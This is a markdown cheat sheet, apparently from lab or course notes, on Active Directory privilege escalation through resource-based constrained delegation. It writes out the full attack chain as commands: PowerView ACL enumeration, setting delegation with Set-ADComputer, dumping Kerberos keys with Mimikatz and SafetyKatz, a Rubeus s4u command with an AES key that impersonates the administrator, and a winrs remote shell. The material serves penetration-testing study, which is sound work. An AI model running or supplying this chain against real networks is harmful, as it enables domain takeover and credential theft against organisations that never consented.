# Domain Privilege Escalation [ RBCD ]
## Methodology/Steps

> 1. Enumerate the users and identify if you have write perms on any object
> 2. Create a list of all the systems where you have write perms
> 3. Store that in $comps variable
> 4. Set RBCD on all of these systems
> 5. Now we can dump the AES keys for the student system ( Remember: Copy the AES key for the system account and not the Virtual Account, you can identify it by the SID. The SID of the system account will be shorter)
> 6. Using Rubeus we can generate a HTTP s4u and get a connection using winrs. If you want to extract more secrets from that system you need to generate a CIFS s4u to transfer files on the system.

---

## PowerShell
### 1. Enumerate if we have Write permissions over any object
```powershell
# PowerView
Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}
```

### 2. Configure RBCD on us-helpdesk for student machines
```powershell
# AD Module
$comps = 'student1$','student2$'
Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps
```

### 3. We we can dump the AES Keys of the Students
```powershell
# Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

# SafetyKatz Binary
SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"

# SafetyKatz Old (For Windows 2020 Server)
SafetyKatz_old.exe -Command "sekurlsa::ekeys" "exit"
```

---

## Binaries
### 4. Rubeus
> Use the AES key of studentx$ with Rubeus and access us-helpdesk as ANY user we want
```powershell
Rubeus.exe s4u /user:student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
```

### 5. Winrs
> Now we can connect to the session
```powershell
winrs -r:us-helpdesk cmd.exe
```
